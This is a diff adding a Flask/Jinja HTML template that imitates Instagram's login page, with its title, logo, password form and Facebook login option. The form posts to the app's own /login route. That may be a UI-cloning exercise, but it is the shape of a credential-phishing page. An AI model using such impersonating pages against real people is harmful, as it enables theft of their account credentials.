@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login • Instagram</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+    <link rel="icon" href="{{ url_for('static', filename='images/instagram-logo.png') }}">
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <img src="{{ url_for('static', filename='images/instagram-logo.png') }}" alt="Instagram" class="logo">
+            <form action="/login" method="POST">
+                <input type="text" name="username" placeholder="Phone number, username, or email" required>
+                <input type="password" name="password" placeholder="Password" required>
+                <button type="submit">Log In</button>
+            </form>
+            <div class="divider">OR</div>
+            <div class="facebook-login">
+                <img src="{{ url_for('static', filename='images/facebook-icon.png') }}" alt="Facebook">
+                <span>Log in with Facebook</span>
+            </div>
+            <a href="#">Forgot password?</a>
+        </div>
+    </div>
+</body>
+</html>
